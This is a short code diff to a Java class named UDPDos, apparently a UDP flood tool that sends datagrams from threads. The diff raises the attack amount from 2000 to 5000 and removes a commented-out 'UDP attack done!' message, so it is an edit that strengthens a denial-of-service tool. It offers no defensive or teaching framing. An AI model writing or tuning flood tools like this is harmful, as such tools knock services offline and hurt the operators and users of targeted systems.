@@ -6,7 +6,7 @@ import java.net.InetAddress;
 
 public class UDPDos extends Thread {
 	private String url = "";
-	private static int amount = 2000;
+	private static int amount = 5000;
 
 	public UDPDos(String url) {
 		this.url = url;
@@ -44,7 +44,6 @@ public class UDPDos extends Thread {
 		DatagramSocket socket = new DatagramSocket();
 		socket.send(dataSent);
 		socket.close();
-		// System.out.println("UDP attack done! - " + "Thread: ");
 	}
 
 }
